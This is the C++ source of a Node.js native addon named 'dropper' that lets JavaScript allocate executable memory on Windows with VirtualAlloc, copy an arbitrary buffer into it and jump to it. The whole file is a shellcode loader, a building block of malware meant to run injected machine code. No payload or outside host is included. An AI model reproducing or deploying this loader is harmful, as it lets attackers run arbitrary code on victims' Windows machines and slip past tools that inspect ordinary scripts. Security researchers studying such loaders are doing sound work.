/*
 * dropper.cpp
 * Copyright (C) 2015 daniele <daniele@Danieles-MacBook-Pro.local>
 *
 * Distributed under terms of the MIT license.
 */

#include <node.h>
#include <node_buffer.h>
#include <windows.h>
#include <iostream>

using namespace v8;

void* area;

void AllocateSpace(const FunctionCallbackInfo<Value>& args)
{
  Isolate* isolate = Isolate::GetCurrent();
  HandleScope scope(isolate);

  unsigned int size = args[0]->Uint32Value();
  area = VirtualAlloc(0, size * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
}

void CopyExecution(const FunctionCallbackInfo<Value>& args)
{
  Isolate* isolate = Isolate::GetCurrent();
  HandleScope scope(isolate);

  Local<Object> bufferObj = args[0]->ToObject();
  char* bufferData = node::Buffer::Data(bufferObj);
  size_t bufferLength = node::Buffer::Length(bufferObj);
  memcpy(area, bufferData, bufferLength);
}

void Execute(const FunctionCallbackInfo<Value>& args)
{
  Isolate* isolate = Isolate::GetCurrent();
  HandleScope scope(isolate);
  (*(void (*)()) area)();
}

void init(Handle<Object> exports)
{
  NODE_SET_METHOD(exports, "allocateSpace", AllocateSpace);
  NODE_SET_METHOD(exports, "copyExecution", CopyExecution);
  NODE_SET_METHOD(exports, "execute", Execute);
}

NODE_MODULE(dropper, init)
